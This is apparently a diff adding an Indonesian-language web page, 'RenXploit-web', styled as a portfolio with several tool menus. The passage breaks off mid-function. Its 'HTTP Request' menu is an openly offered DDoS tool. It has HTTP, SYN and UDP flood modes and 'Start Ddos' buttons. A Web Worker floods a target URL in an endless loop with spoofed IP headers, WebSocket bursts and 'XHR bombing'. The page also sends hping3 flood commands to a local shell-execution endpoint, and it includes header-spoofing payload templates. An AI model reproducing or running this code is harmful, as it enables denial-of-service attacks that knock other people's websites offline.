@@ -1,0 +1,1172 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>RenXploit-web</title>
+  <!-- Google Fonts untuk tampilan modern dan fancy -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Pacifico&display=swap" rel="stylesheet">
+  <!-- Library CryptoJS untuk enkripsi (MD5, SHA256, AES, dll.) -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+  <style>
+    /* Basic Reset */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #0d1b2a, #1b263b);
+      color: #333;
+      line-height: 1.6;
+      overflow-x: hidden;
+    }
+    a { text-decoration: none; color: inherit; }
+    
+    /* Header dengan background gambar & overlay */
+    header {
+      position: relative;
+      background: url("https://f.top4top.io/p_3329uuu3s1.jpg") no-repeat center center/cover;
+      background-attachment: fixed;
+      color: #fff;
+      text-align: center;
+      padding: 80px 20px 40px;
+      overflow: hidden;
+    }
+    header::before {
+      content: "";
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 1;
+    }
+    header h1, header p {
+      position: relative;
+      z-index: 2;
+      animation: fadeInDown 1s ease-out;
+    }
+    @keyframes fadeInDown {
+      0% { opacity: 0; transform: translateY(-20px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+    header h1 { font-size: 3rem; margin-bottom: 10px; }
+    header p { font-size: 1.2rem; }
+    #visitorCounter { margin-top: 15px; font-size: 1.1rem; font-weight: 500; }
+    
+    /* Tombol Sidebar (Hamburger) */
+    .sidebar-toggle {
+      position: fixed;
+      top: 15px;
+      left: 15px;
+      background: #4a90e2;
+      border: none;
+      color: #fff;
+      font-size: 24px;
+      padding: 10px 15px;
+      border-radius: 4px;
+      z-index: 1200;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .sidebar-toggle:hover { background: #357ABD; }
+    
+    /* Sidebar styling */
+    #sidebar {
+      position: fixed;
+      top: 0;
+      left: -250px; /* tersembunyi di luar layar */
+      width: 250px;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.85);
+      color: #fff;
+      transition: left 0.3s ease;
+      z-index: 1100;
+      padding-top: 60px;
+    }
+    #sidebar.active {
+      left: 0;
+    }
+    #sidebar ul {
+      list-style: none;
+      padding: 0;
+    }
+    #sidebar ul li {
+      padding: 15px 20px;
+      cursor: pointer;
+      border-bottom: 1px solid #444;
+      transition: background 0.3s;
+    }
+    #sidebar ul li:hover {
+      background-color: #444;
+    }
+    #sidebar .close-btn {
+      position: absolute;
+      top: 15px;
+      right: 20px;
+      font-size: 24px;
+      cursor: pointer;
+    }
+    
+    /* Container utama */
+    .container {
+      max-width: 1200px;
+      margin: 40px auto;
+      padding: 0 20px;
+    }
+    
+    /* Style untuk tiap menu (section) dengan efek glass */
+    .menu-section {
+      display: none;
+      background: rgba(255, 255, 255, 0.85);
+      border-radius: 12px;
+      padding: 30px;
+      margin-bottom: 40px;
+      box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      border: 1px solid rgba(255, 255, 255, 0.18);
+    }
+    
+    /* === Menu 1: Main Menu === */
+    #menu1 {
+      text-align: center;
+      padding: 60px 20px;
+      background: linear-gradient(135deg, #4a90e2, #9013fe);
+      color: #fff;
+      border-radius: 12px;
+      position: relative;
+      overflow: hidden;
+    }
+    #menu1 h2 {
+      font-family: 'Pacifico', cursive;
+      font-size: 3rem;
+      background: linear-gradient(90deg, #ff7e5f, #feb47b);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: glow 1.5s ease-in-out infinite alternate;
+    }
+    @keyframes glow {
+      from { text-shadow: 0 0 10px rgba(255,126,95,0.8); }
+      to { text-shadow: 0 0 20px rgba(255,126,95,1); }
+    }
+    #menu1 p {
+      font-size: 1.2rem;
+      margin-top: 20px;
+    }
+    
+    /* === Menu 2: HTTP Request === */
+    .request-section h2 { margin-bottom: 20px; font-size: 1.8rem; }
+    .request-section label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: 600;
+    }
+    .request-section input,
+    .request-section select,
+    .request-section textarea {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+    .request-section button {
+      padding: 12px 24px;
+      border: none;
+      background: #4a90e2;
+      color: #fff;
+      border-radius: 6px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.3s;
+      margin-right: 10px;
+    }
+    .request-section button:hover { background: #357ABD; }
+    #status { margin-top: 15px; font-style: italic; color: #555; }
+    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+    table th, table td { border: 1px solid #ddd; padding: 10px; text-align: center; }
+    table th { background: #f7f7f7; }
+    #resultSummary { margin-top: 10px; font-weight: 600; font-size: 1.1rem; }
+    
+    /* === Menu 3: Profile === */
+    #menu3 .profile-img {
+      width: 300px;
+      max-width: 100%;
+      border-radius: 50%;
+      display: block;
+      margin: 20px auto;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+    }
+    #menu3 p {
+      text-align: center;
+      font-size: 1.1rem;
+      margin-top: 10px;
+    }
+    
+    /* === Menu 4: Website Info === */
+    #menu4 input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+    #menu4 button {
+      padding: 12px 24px;
+      border: none;
+      background: #4a90e2;
+      color: #fff;
+      border-radius: 6px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    #menu4 button:hover { background: #357ABD; }
+    #infoResult {
+      margin-top: 20px;
+      font-size: 1rem;
+      color: #333;
+    }
+    
+    /* === Menu 5: Script Runner === */
+    #menu5 select, #menu5 textarea {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+    #menu5 button {
+      padding: 12px 24px;
+      border: none;
+      background: #4a90e2;
+      color: #fff;
+      border-radius: 6px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    #menu5 button:hover { background: #357ABD; }
+    #scriptOutput {
+      margin-top: 20px;
+      padding: 15px;
+      background: #f7f7f7;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      min-height: 100px;
+    }
+    
+    /* === Menu 6: Encryption Tools === */
+    #menu6 textarea, #menu6 input, #menu6 select {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+    #menu6 button {
+      padding: 12px 24px;
+      border: none;
+      background: #4a90e2;
+      color: #fff;
+      border-radius: 6px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.3s;
+      margin-right: 10px;
+    }
+    #menu6 button:hover { background: #357ABD; }
+    #encryptResult {
+      margin-top: 15px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      background: #f7f7f7;
+    }
+    
+    /* === Menu 7: Telegram Bot Control === */
+    #menu7 textarea, #menu7 input, #menu7 select {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+    #menu7 button {
+      padding: 12px 24px;
+      border: none;
+      background: #4a90e2;
+      color: #fff;
+      border-radius: 6px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.3s;
+      margin-right: 10px;
+    }
+    #menu7 button:hover { background: #357ABD; }
+    #botStatus {
+      margin-top: 15px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      background: #f7f7f7;
+    }
+    
+    /* Footer */
+    footer {
+      text-align: center;
+      padding: 20px;
+      background: #fff;
+      border-top: 1px solid #ddd;
+      margin-top: 40px;
+      font-size: 0.9rem;
+    }
+    
+    @keyframes rippleEffect {
+      0% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.2); opacity: 0.5; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+    @keyframes slideFadeIn {
+      0% { transform: translateY(-100%); opacity: 0; }
+      100% { transform: translateY(0); opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+  <!-- Tombol hamburger (untuk membuka sidebar) -->
+  <button id="openSidebar" class="sidebar-toggle">&#9776;</button>
+  
+  <!-- Sidebar Menu -->
+  <div id="sidebar">
+    <span class="close-btn" id="closeSidebar">&times;</span>
+    <ul>
+      <li onclick="showMenu('menu1')">Main Menu</li>
+      <li onclick="showMenu('menu2')">HTTP Request</li>
+      <li onclick="showMenu('menu3')">Profile</li>
+      <li onclick="showMenu('menu4')">Website Info</li>
+      <li onclick="showMenu('menu5')">Script Runner</li>
+      <li onclick="showMenu('menu6')">Encryption Tools</li>
+      <li onclick="showMenu('menu7')">Telegram Bot</li>
+    </ul>
+  </div>
+  
+  <!-- Header -->
+  <header>
+    <h1>Selamat Datang di Website RenXploit</h1>
+    <p>Saya telah mengembangkan website dengan fitur Chat Bot &amp; Pengiriman HTTP Request</p>
+    <br>
+    <p>Anda bisa mencoba website ini dengan payloads untuk menemukan bug XSS</p>
+    <div id="visitorCounter">Pengunjung: <span id="visitorCount">Loading...</span></div>
+  </header>
+  
+  <!-- Kontainer Utama -->
+  <div class="container">
+    
+    <!-- Menu 1: Main Menu -->
+    <section id="menu1" class="menu-section">
+      <div style="font-size: 3em; animation: rippleEffect 3s infinite;">WELCOME...</div>
+      <p>Ini adalah tampilan utama dengan desain yang sangat keren dan canggih. Nikmati pengalaman antarmuka yang modern dan inovatif!</p>
+    </section>
+    
+    <!-- Menu 2: HTTP Request -->
+    <section id="menu2" class="menu-section">
+      <label for="attackMode">Mode Request</label>
+<select id="attackMode">
+  <option value="normal">Normal Request</option>
+  <option value="http_flood">HTTP Flood</option>
+  <option value="syn_flood">SYN Flood</option>
+  <option value="udp_flood">UDP Flood</option>
+</select>
+      <div class="request-section">
+        <h1 style="animation: slideFadeIn 1s forwards; font-size: 30px;">Kirim HTTP Request</h1>
+        <label for="url">URL</label>
+        <input type="text" id="url" placeholder="https://contoh.com">
+        
+        <label for="senderName">Nama Pengirim Opsional</label>
+        <input type="text" id="senderName" placeholder="Masukkan nama Anda">
+        
+        <label for="method">Method (Pilih salah satu)</label>
+        <select id="method">
+          <option value="GET">GET</option>
+          <option value="POST">POST</option>
+          <option value="PUT">PUT</option>
+          <option value="DELETE">DELETE</option>
+          <option value="HEAD">HEAD</option>
+          <option value="OPTIONS">OPTIONS</option>
+          <option value="PATCH">PATCH</option>
+          <option value="TRACE">TRACE</option>
+          <option value="CONNECT">CONNECT</option>
+          <option value="PROPFIND">PROPFIND</option>
+        </select>
+        
+        <label for="payload">Payload (hanya untuk method selain GET/HEAD)</label>
+        <textarea id="payload" rows="4" placeholder='{"key": "value"}'></textarea>
+        
+        <label for="threads">Jumlah Threads</label>
+        <input type="number" id="threads" value="1" min="1" max="10">
+        
+        <div>
+          <button id="start">Start Ddos</button>
+          <button id="stop">Stop Ddos</button>
+        </div>
+        
+        <div id="status"></div>
+        
+        <!-- Tabel Log -->
+        <table id="logTable">
+          <thead>
+            <tr>
+              <th>No</th>
+              <th>Timestamp</th>
+              <th>Thread</th>
+              <th>Method</th>
+              <th>Sender</th>
+              <th>Status</th>
+            </tr>
+          </thead>
+          <tbody>
+            <!-- Log akan ditambahkan secara dinamis -->
+          </tbody>
+        </table>
+        
+        <!-- Ringkasan Hasil -->
+        <div id="resultSummary">Total Sukses: 0 | Total Gagal: 0</div>
+        
+        <!-- Tombol Panduan Penggunaan -->
+        <button id="toggleGuide">Tampilkan Panduan</button>
+        
+        <!-- Panel Panduan Penggunaan -->
+        <div id="usageGuide" style="display:none;">
+          <h1 style="animation: slideFadeIn 1s forwards; font-size: 20px;">Panduan Penggunaan HTTP Request</h1>
+          <ul>
+            <li><strong>GET:</strong> Mengambil data dari server.</li>
+            <li><strong>POST:</strong> Mengirim data baru ke server.</li>
+            <li><strong>PUT:</strong> Mengganti data yang ada secara keseluruhan.</li>
+            <li><strong>DELETE:</strong> Menghapus data dari server.</li>
+            <li><strong>HEAD:</strong> Mengambil header respons tanpa body.</li>
+            <li><strong>OPTIONS:</strong> Mengambil opsi komunikasi yang didukung server.</li>
+            <li><strong>PATCH:</strong> Mengupdate sebagian data yang ada.</li>
+            <li><strong>TRACE:</strong> Melacak rute request yang dikirim.</li>
+            <li><strong>CONNECT:</strong> Menghubungkan ke server melalui proxy.</li>
+            <li><strong>PROPFIND:</strong> Mengambil properti dari resource (umumnya WebDAV).</li>
+          </ul>
+          <p>Pastikan URL valid (gunakan http:// atau https://) dan payload sesuai dengan method yang dipilih.</p>
+          <br>
+          <p>Contoh payload untuk request POST:</p>
+          <br>
+          <pre>
+{
+  "action": "create",
+  "data": {
+    "name": "RenXploit Tools",
+    "type": "security",
+    "status": "active"
+  }
+}
+          <br>
+          </br>
+          <pre>
+            {
+  "headers": {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{{random_number}}.0.{{random_number}} Safari/537.36",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Referer": "http://{{random_string}}.com"
+  },
+  "action": "access_target",
+  "target": "URL_WEBSITE"
+}
+<br>
+</br>
+<pre>
+  {
+  "headers": {
+    "Referer": "http://{{random_string}}.com",
+    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "X-Forwarded-For": "{{random_ip}}",
+    "X-Real-IP": "{{random_ip}}"
+  },
+  "target": "URL_WEBSITE"
+}
+</pre>
+<br>
+</br>
+<pre>
+  {
+  "method": "POST",
+  "headers": {
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36"
+  },
+  "data": {
+    "user": "{{random_name}}",
+    "email": "{{random_email}}",
+    "message": "{{random_string}}"
+  },
+  "target": "URL_WEBSITE"
+}
+</pre>
+
+<br>
+</br>
+<pre>
+  {
+  "headers": {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{{random_number}}.0.{{random_number}} Safari/537.36",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Referer": "http://{{random_string}}.com"
+  },
+  "action": "access_target",
+  "target": "URL_WEBSITE"
+}
+</pre>
+          </pre>
+        </div>
+      </div>
+    </section>
+    
+    <!-- Menu 3: Profile -->
+    <section id="menu3" class="menu-section">
+      <h2>Profil Saya</h2>
+      <img src="https://via.placeholder.com/300" alt="Profil Saya" class="profile-img">
+      <p>Halo, saya [Nama Anda]. Saya seorang web developer yang berdedikasi menciptakan solusi digital canggih, modern, dan inovatif. Terima kasih telah mengunjungi profil saya!</p>
+    </section>
+    
+    <!-- Menu 4: Website Info -->
+    <section id="menu4" class="menu-section">
+      <h2>Informasi Website</h2>
+      <label for="infoUrl">Masukkan URL Website</label>
+      <input type="text" id="infoUrl" placeholder="https://contoh.com">
+      <button onclick="cekWebsiteInfo()">Dapatkan Info</button>
+      <div id="infoResult"></div>
+    </section>
+    
+    <!-- Menu 5: Script Runner -->
+    <section id="menu5" class="menu-section">
+      <h2>Script Runner</h2>
+      <label for="scriptType">Pilih Jenis Script</label>
+      <select id="scriptType">
+        <option value="HTML">HTML</option>
+        <option value="CSS">CSS</option>
+        <option value="JavaScript">JavaScript</option>
+        <option value="PHP">PHP</option>
+        <option value="Random">Random</option>
+      </select>
+      <label for="scriptContent">Masukkan Script</label>
+      <textarea id="scriptContent" rows="6" placeholder="Tuliskan script di sini..."></textarea>
+      <button onclick="runScript()">Jalankan Script</button>
+      <div id="scriptOutput"></div>
+    </section>
+    
+    <!-- Menu 6: Encryption Tools -->
+    <section id="menu6" class="menu-section">
+      <h2>Encryption Tools</h2>
+      <label for="encryptInput">Masukkan Teks</label>
+      <textarea id="encryptInput" rows="4" placeholder="Masukkan teks yang ingin dienkripsi..."></textarea>
+      
+      <label for="encryptMethod">Pilih Metode Enkripsi</label>
+      <select id="encryptMethod" onchange="toggleAESKey()">
+        <option value="SHA-256">SHA-256</option>
+        <option value="MD5">MD5</option>
+        <option value="Base64">Base64 Encode</option>
+        <option value="Salt">Generate Salt</option>
+        <option value="Hash+Salt">Hash + Salt (SHA-256)</option>
+        <option value="AES">AES Encrypt</option>
+      </select>
+      
+      <div id="aesKeyContainer" style="display:none;">
+        <label for="aesKey">Masukkan Key untuk AES</label>
+        <input type="text" id="aesKey" placeholder="Masukkan key untuk AES encryption">
+      </div>
+      
+      <button onclick="encryptText()">Enkripsi</button>
+      <div id="encryptResult"></div>
+      <button onclick="copyEncryptResult()">Copy Hasil</button>
+    </section>
+    
+    <!-- Menu 7: Telegram Bot Control -->
+    <section id="menu7" class="menu-section">
+      <h2>Telegram Bot Control</h2>
+      <label for="botToken">Masukkan Bot Token (dari BotFather)</label>
+      <input type="text" id="botToken" placeholder="Contoh: 123456789:ABCdefGHIjklMNOpqrSTUvwxYZ">
+      
+      <label for="botScript">Masukkan Script Python (opsional, jika ingin menggunakan custom script)</label>
+      <textarea id="botScript" rows="8" placeholder="Tuliskan script Python di sini..."></textarea>
+      
+      <label for="botFile">Atau Upload File Python (.py)</label>
+      <input type="file" id="botFile" accept=".py">
+      
+      <div>
+        <button onclick="startTelegramBot()">Start Bot</button>
+        <button onclick="stopTelegramBot()">Stop Bot</button>
+      </div>
+      <div id="botStatus"></div>
+      <p style="font-size:0.9em; color:#555;">Catatan: Setelah bot diaktifkan, bot akan tetap hidup di server meskipun halaman di-refresh hingga tombol Stop Bot diklik.</p>
+    </section>
+    
+  </div>
+  
+  <footer>
+    &copy; 2025 Portfolio Saya. All rights reserved.
+  </footer>
+  
+  <script>
+    /* --- Sidebar Toggle --- */
+    document.getElementById("start").addEventListener("click", function () {
+    let url = document.getElementById("url").value;
+    let method = document.getElementById("method").value;
+    let payload = document.getElementById("payload").value;
+    let threads = parseInt(document.getElementById("threads").value);
+    let attackMode = document.getElementById("attackMode").value;
+
+    if (!url) {
+        alert("Masukkan URL target!");
+        return;
+    }
+
+    if (attackMode === "normal") {
+        sendRequest(url, method, payload);
+    } else if (attackMode === "http_flood") {
+        startHttpFlood(url, method, payload, threads);
+    } else if (attackMode === "syn_flood") {
+        startSynFlood(url);
+    } else if (attackMode === "udp_flood") {
+        startUdpFlood(url);
+    }
+});
+
+// Fungsi untuk request biasa
+function sendRequest(url, method, payload) {
+    fetch(url, {
+        method: method,
+        headers: { "Content-Type": "application/json" },
+        body: method !== "GET" && method !== "HEAD" ? payload : null,
+    })
+        .then(response => {
+            console.log(`[+] Request sukses: ${response.status}`);
+        })
+        .catch(error => {
+            console.error(`[!] Request gagal: ${error}`);
+        });
+}
+
+if (window.Worker) {
+    const workerCode = `
+        self.onmessage = function(event) {
+            const { urls, methods, useProxy, adaptiveMode } = event.data;
+            const userAgents = [
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6200.140 Safari/537.36",
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 16_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.214 Safari/537.36",
+                "Mozilla/5.0 (Linux; Android 16; SM-S1000B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.5993.198 Mobile Safari/537.36"
+            ];
+
+            function getRandomIP() {
+                return Math.floor(Math.random() * 255) + "." +
+                       Math.floor(Math.random() * 255) + "." +
+                       Math.floor(Math.random() * 255) + "." +
+                       Math.floor(Math.random() * 255);
+            }
+
+            function getRandomHeaders() {
+                return {
+                    "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
+                    "X-Forwarded-For": getRandomIP(),
+                    "X-Real-IP": getRandomIP(),
+                    "Referer": "https://" + Math.random().toString(36).substring(7) + ".com/",
+                    "Sec-Ch-Ua": '"Chromium";v="121", "Not:A-Brand";v="121"',
+                    "DNT": Math.random() > 0.5 ? "1" : "0",
+                    "Sec-Fetch-Site": "same-site",
+                    "Sec-Fetch-Mode": "navigate",
+                    "Sec-Fetch-Dest": "document",
+                    "Cache-Control": "no-cache",
+                    "Pragma": "no-cache",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Upgrade-Insecure-Requests": "1"
+                };
+            }
+
+            function getRandomPayload() {
+                let obj = {};
+                for (let i = 0; i < Math.floor(Math.random() * 50) + 10; i++) {
+                    obj[Math.random().toString(36).substring(7)] = Math.random().toString(36).substring(10);
+                }
+                return JSON.stringify(obj);
+            }
+
+            async function sendRequest() {
+                while (true) {
+                    let url = urls[Math.floor(Math.random() * urls.length)];
+                    let method = methods[Math.floor(Math.random() * methods.length)];
+                    let headers = getRandomHeaders();
+                    let body = method !== "GET" && method !== "HEAD" ? getRandomPayload() : null;
+                    
+                    let proxy = useProxy ? "https://" + Math.random().toString(36).substring(7) + ".proxy.com/" : "";
+                    let attackType = Math.random();
+
+                    try {
+                        if (attackType < 0.25) {
+                            // HTTP Flood
+                            await fetch(proxy + url, {
+                                method: method,
+                                headers: headers,
+                                body: body,
+                                mode: "no-cors",
+                                keepalive: true
+                            });
+                            self.postMessage("[+] HTTP Request Sent to " + url);
+                        } else if (attackType < 0.5) {
+                            // WebSocket Flood
+                            let ws = new WebSocket(url.replace(/^http/, "ws"));
+                            ws.onopen = () => {
+                                for (let i = 0; i < 50; i++) {
+                                    ws.send(getRandomPayload());
+                                }
+                                ws.close();
+                            };
+                            self.postMessage("[+] WebSocket Sent to " + url);
+                        } else if (attackType < 0.75) {
+                            // XHR Bombing
+                            let xhr = new XMLHttpRequest();
+                            xhr.open(method, url, true);
+                            for (let key in headers) {
+                                xhr.setRequestHeader(key, headers[key]);
+                            }
+                            xhr.send(body);
+                            self.postMessage("[+] XHR Sent " + method + " to " + url);
+                        } else {
+                            // AI Human Emulation
+                            let img = new Image();
+                            img.src = url + "?cache=" + Math.random();
+                            self.postMessage("[+] Simulated User Request to " + url);
+                        }
+                    } catch (error) {
+                        self.postMessage("[!] Error: " + error.message);
+                    }
+
+                    await new Promise(resolve => setTimeout(resolve, Math.random() * 3));
+                }
+            }
+
+            sendRequest();
+        };
+    `;
+
+    function startHttpFlood(urls, threads, useProxy = false, adaptiveMode = true) {
+        console.log(`[🔥] HTTP Flood v9 – Quantum AI Singularity Started on ${urls.length} URLs with ${threads} threads`);
+
+        let methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"];
+
+        for (let i = 0; i < threads; i++) {
+            const workerBlob = new Blob([workerCode], { type: "application/javascript" });
+            const worker = new Worker(URL.createObjectURL(workerBlob));
+            worker.postMessage({ urls, methods, useProxy, adaptiveMode });
+
+            worker.onmessage = function(event) {
+                console.log(event.data);
+            };
+        }
+    }
+}
+
+// SYN Flood (Layer 4) - Panggil via Termux
+function startSynFlood(url) {
+    let ip = extractIp(url);
+    if (!ip) {
+        alert("Gagal mendapatkan IP target!");
+        return;
+    }
+    let command = `hping3 -S --flood -V -p 443 ${ip}`;
+    executeCommand(command);
+}
+
+// UDP Flood (Layer 4) - Panggil via Termux
+function startUdpFlood(url) {
+    let ip = extractIp(url);
+    if (!ip) {
+        alert("Gagal mendapatkan IP target!");
+        return;
+    }
+    let command = `hping3 --udp --flood -p 80 ${ip}`;
+    executeCommand(command);
+}
+
+// Fungsi ekstrak IP dari URL (butuh server-side atau API eksternal)
+function extractIp(url) {
+    let match = url.match(/https?:\/\/([^\/]+)/);
+    return match ? match[1] : null;
+}
+
+// Eksekusi perintah shell di Termux (harus ada backend handler)
+function executeCommand(cmd) {
+    fetch("http://localhost:5000/execute", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ command: cmd }),
+    })
+        .then(response => response.text())
+        .then(output => console.log(`[+] Command Output: ${output}`))
+        .catch(error => console.error(`[!] Command Error: ${error}`));
+}
+
+    const sidebar = document.getElementById('sidebar');
+    const openSidebarBtn = document.getElementById('openSidebar');
+    const closeSidebarBtn = document.getElementById('closeSidebar');
+    
+    openSidebarBtn.addEventListener('click', () => {
+      sidebar.classList.add('active');
+    });
+    closeSidebarBtn.addEventListener('click', () => {
+      sidebar.classList.remove('active');
+    });
+    
+    /* --- Fungsi untuk menampilkan section menu yang dipilih --- */
+    function showMenu(menuId) {
+      const sections = document.querySelectorAll('.menu-section');
+      sections.forEach(section => section.style.display = 'none');
+      document.getElementById(menuId).style.display = 'block';
+      window.scrollTo(0, 0); // scroll ke atas
+      sidebar.classList.remove('active');
+    }
+    // Tampilkan menu utama (Menu 1) secara default
+    showMenu('menu1');
+    
+    /* --- Visitor Counter --- */
+    fetch('https://api.countapi.xyz/hit/THEOYS123/myportfolio')
+      .then(response => response.json())
+      .then(data => {
+        document.getElementById('visitorCount').innerText = data.value;
+      })
+      .catch(err => {
+        console.error('Visitor counter error:', err);
+        document.getElementById('visitorCount').innerText = 'N/A';
+      });
+      
+    /* --- Toggle Panduan Penggunaan (untuk HTTP Request) --- */
+    const toggleGuideBtn = document.getElementById('toggleGuide');
+    const usageGuide = document.getElementById('usageGuide');
+    toggleGuideBtn.addEventListener('click', () => {
+      if (usageGuide.style.display === 'none' || usageGuide.style.display === '') {
+        usageGuide.style.display = 'block';
+        toggleGuideBtn.textContent = 'Tutup Panduan';
+      } else {
+        usageGuide.style.display = 'none';
+        toggleGuideBtn.textContent = 'Tampilkan Panduan';
+      }
+    });
+    
+    /* --- Helper Functions untuk HTTP Request --- */
+    function getUrl() {
+      let url = document.getElementById('url').value.trim();
+      if (!/^https?:\/\//i.test(url)) {
+        url = "https://" + url;
+      }
+      return url;
+    }
+    function extractHostname(url) {
+      try {
+        let u = new URL(url);
+        return u.hostname;
+      } catch (e) {
+        return url;
+      }
+    }
+    
+    /* --- Fitur HTTP Request (Menu 2) --- */
+    let intervals = [];
+    let successCount = 0;
+    let failCount = 0;
+    let logCounter = 0;
+    const logTableBody = document.querySelector('#logTable tbody');
+    const resultSummary = document.getElementById('resultSummary');
+    
+    function updateSummary() {
+      resultSummary.textContent = `Total Sukses: ${successCount} | Total Gagal: ${failCount}`;
+    }
+    function addLogRow(threadId, method, sender, status) {
+      logCounter++;
+      const row = document.createElement('tr');
+      const timestamp = new Date().toLocaleTimeString();
+      row.innerHTML = `
+        <td>${logCounter}</td>
+        <td>${timestamp}</td>
+        <td>${threadId}</td>
+        <td>${method}</td>
+        <td>${sender}</td>
+        <td>${status}</td>
+      `;
+      logTableBody.appendChild(row);
+    }
+    document.getElementById('start').addEventListener('click', () => {
+      let url = getUrl();
+      const senderName = document.getElementById('senderName').value.trim() || 'Test';
+      const method = document.getElementById('method').value;
+      const payload = document.getElementById('payload').value.trim();
+      const threads = parseInt(document.getElementById('threads').value, 10);
+      const statusDiv = document.getElementById('status');
+    
+      // Deteksi payload XSS (contoh sederhana)
+      if (payload && /((<|%3C)\s*script|javascript:|onerror\s*=)/i.test(payload)) {
+        statusDiv.innerHTML = '<span style="color:red;">cie-cie yang lagi nyari bug XSS, Refleccc pasti lagi gabut yaa....</span>';
+        return;
+      }
+    
+      if (!url) {
+        alert("Masukkan URL yang valid!");
+        return;
+      }
+      statusDiv.textContent = "Mengirim request...";
+      for (let i = 0; i < threads; i++) {
+        const intervalId = setInterval(() => {
+          let options = { 
+            method,
+            mode: 'no-cors',  // gunakan no-cors agar request tetap dikirim ke server target
+            cache: 'no-store'
+          };
+          if (method !== "GET" && method !== "HEAD") {
+            options.headers = {
+              "Content-Type": "application/json",
+              "X-Sender": senderName
+            };
+            options.body = payload ? payload : "{}";
+          }
+          fetch(url, options)
+            .then(response => {
+              // Karena mode no-cors, respons bersifat opaque.
+              successCount++;
+              addLogRow(i + 1, method, senderName, 'Terkirim');
+              updateSummary();
+              return response.text();
+            })
+            .then(data => console.log(`Response [Thread ${i+1}]:`, data))
+            .catch(err => {
+              failCount++;
+              addLogRow(i + 1, method, senderName, 'Gagal');
+              updateSummary();
+              console.error(`Error [Thread ${i+1}]:`, err);
+            });
+        }, 2000);
+        intervals.push(intervalId);
+      }
+      statusDiv.textContent = "Request telah dikirim (mode no-cors). Periksa konsol untuk detail.";
+    });
+    document.getElementById('stop').addEventListener('click', () => {
+      intervals.forEach(id => clearInterval(id));
+      intervals = [];
+      document.getElementById('status').textContent = "Pengiriman request dihentikan.";
+    });
+    
+    /* --- Fitur Website Info (Menu 4) --- */
+    function cekWebsiteInfo() {
+      let url = document.getElementById('infoUrl').value.trim();
+      if (!url) {
+        alert("Masukkan URL website!");
+        return;
+      }
+      if (!/^https?:\/\//i.test(url)) {
+        url = "https://" + url;
+      }
+      document.getElementById('infoResult').innerHTML = "Mengambil informasi...";
+      const hostname = (new URL(url)).hostname;
+      const start = performance.now();
+      
+      // Gunakan proxy AllOrigins agar tidak terhambat CORS
